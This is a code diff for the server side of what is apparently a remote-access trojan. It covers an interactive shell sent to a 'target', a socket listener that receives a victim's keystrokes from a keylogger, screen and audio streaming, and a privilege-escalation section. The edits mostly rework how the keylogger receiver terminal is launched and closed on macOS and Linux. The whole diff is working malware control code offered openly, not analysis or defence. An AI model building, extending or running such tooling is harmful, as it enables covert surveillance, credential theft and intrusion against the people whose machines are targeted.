@@ -9,6 +9,9 @@ import pyaudio
 import queue
 import multiprocessing
 from dotenv import load_dotenv
+import sys
+import subprocess
+import signal
 
 # ====================
 # Environment
@@ -96,7 +99,6 @@ keylogger_process = None
 # Function for the main communication loop with the target
 def target_communication(target):
     dir = ''
-    keylogger_socket, keylogger_thread = None, None
     while True:
         command = input(f'* Shell~{str(TARGET_IP)}: {dir}$ ')
         reliable_send(target, command)
@@ -104,13 +106,6 @@ def target_communication(target):
         # Common command
         if command == 'quit':
             stop_screen_stream()
-            # Terminate the main program and keylogger process
-            print("Terminating keylogger and main program...")
-            if keylogger_socket:
-                reliable_send(keylogger_socket, "TERMINATE")
-                keylogger_socket.close()
-            if keylogger_thread:
-                keylogger_thread.join(timeout=1)
             terminate_keylogger_terminal()
             break
         elif command == 'clear':
@@ -130,17 +125,7 @@ def target_communication(target):
         # Screen Streaming
         elif command == 'screen':
             connected = {'video': False, 'audio': False}
-            start_screen_stream(connected)
-            print('''
- _____                            _____ _                            _             
-/  ___|                          /  ___| |                          (_)            
-\ `--.  ___ _ __ ___  ___ _ __   \ `--.| |_ _ __ ___  __ _ _ __ ___  _ _ __   __ _ 
- `--. \/ __| '__/ _ \/ _ \ '_ \   `--. \ __| '__/ _ \/ _` | '_ ` _ \| | '_ \ / _` |
-/\__/ / (__| | |  __/  __/ | | | /\__/ / |_| | |  __/ (_| | | | | | | | | | | (_| |
-\____/ \___|_|  \___|\___|_| |_| \____/ \__|_|  \___|\__,_|_| |_| |_|_|_| |_|\__, |
-                                                                              __/ |
-                                                                             |___/ 
-''')
+            start_screen_stream(connected)    
         
         # Keylogger
         elif command == 'keylogger':
@@ -157,8 +142,9 @@ def target_communication(target):
 # ====================
 
 # Keylogger receiver function
-
 def keylogger_receiver():
+    global keylogger_socket
+
     keylogger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     keylogger_socket.bind((TARGET_IP, KEYLOGGER_PORT))
     keylogger_socket.listen(1)
@@ -179,19 +165,17 @@ _|"""""|_|"""""|_| """"|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
         
         while True:
             keystroke = reliable_recv(keylogger_client)  # Implement reliable_recv function as per your implementation
-            print(keystroke)
-            if keystroke == "esc":
+            if keystroke == "TERMINATE":
+                print("Terminating keylogger...")
                 break
+            print(keystroke)   
     
     except Exception as e:
         print(f"Error in keylogger receiver: {e}")
     
     finally:
+        print('CLOSED BY RECEIVER')
         keylogger_socket.close()
-
-import sys
-import subprocess
-import signal
 
 # Function to get the virtual environment path
 def get_virtualenv_path():
@@ -208,7 +192,7 @@ def get_virtualenv_path():
 
 # Function to handle keylogger terminal
 def keylogger_terminal():
-    global keylogger_process  # Access the global variable
+    global keylogger_process, keylogger_terminal_id  # Access the global variables
     current_dir = os.path.abspath('.')
     virtualenv_activate = get_virtualenv_path()
 
@@ -218,8 +202,12 @@ def keylogger_terminal():
                 osascript_command = f'tell application "iTerm"\n' \
                                     f'  create window with default profile\n' \
                                     f'  tell current session of current window to write text "cd {current_dir} && source {virtualenv_activate} && python3 -c \\"import server; server.keylogger_receiver()\\""\n' \
+                                    f'  set terminal_id to id of current window\n' \
                                     f'end tell'
-                keylogger_process = subprocess.Popen(["osascript", "-e", osascript_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                process = subprocess.Popen(["osascript", "-e", osascript_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                out, err = process.communicate()
+                keylogger_terminal_id = out.decode().strip()
+                keylogger_process = process
             else:  # Linux (example with gnome-terminal)
                 terminal_command = f'gnome-terminal -- bash -c "cd {current_dir} && source {virtualenv_activate} && python3 -c \\"import server; server.keylogger_receiver()\\"; exec bash"'
                 keylogger_process = subprocess.Popen(terminal_command, shell=True)
@@ -227,14 +215,23 @@ def keylogger_terminal():
         print("Virtual environment not found.")
 
 def terminate_keylogger_terminal():
-    global keylogger_process
+    global keylogger_process, keylogger_terminal_id
     if keylogger_process:
-        if 'darwin' in os.uname().sysname.lower():  # macOS
-            os.killpg(os.getpgid(keylogger_process.pid), signal.SIGTERM)
-        else:  # Linux
-            keylogger_process.terminate()
-        keylogger_process = None
-
+        try:
+            if 'darwin' in os.uname().sysname.lower():  # macOS
+                if keylogger_terminal_id:
+                    osascript_close_command = f'tell application "iTerm" to close window id {keylogger_terminal_id}'
+                    subprocess.Popen(["osascript", "-e", osascript_close_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                else:
+                    os.killpg(os.getpgid(keylogger_process.pid), signal.SIGTERM)
+            else:  # Linux
+                keylogger_process.terminate()
+            keylogger_process = None
+        except ProcessLookupError:
+            print("Keylogger process already terminated.")
+        except Exception as e:
+            print(f"Error terminating keylogger process: {e}")
+            
 # ====================
 # Feature 2: Privilege Escalation
 # ====================
@@ -377,6 +374,17 @@ def start_screen_stream(connected):
     # Wait for a signal from the child process
     message = commu_queue.get()
     print(f"Received message from screen process: {message}")
+
+    print('''
+ _____                            _____ _                            _             
+/  ___|                          /  ___| |                          (_)            
+\ `--.  ___ _ __ ___  ___ _ __   \ `--.| |_ _ __ ___  __ _ _ __ ___  _ _ __   __ _ 
+ `--. \/ __| '__/ _ \/ _ \ '_ \   `--. \ __| '__/ _ \/ _` | '_ ` _ \| | '_ \ / _` |
+/\__/ / (__| | |  __/  __/ | | | /\__/ / |_| | |  __/ (_| | | | | | | | | | | (_| |
+\____/ \___|_|  \___|\___|_| |_| \____/ \__|_|  \___|\__,_|_| |_| |_|_|_| |_|\__, |
+                                                                              __/ |
+                                                                             |___/ 
+''')
 
 # Function to stop screen streaming process
 def stop_screen_stream():
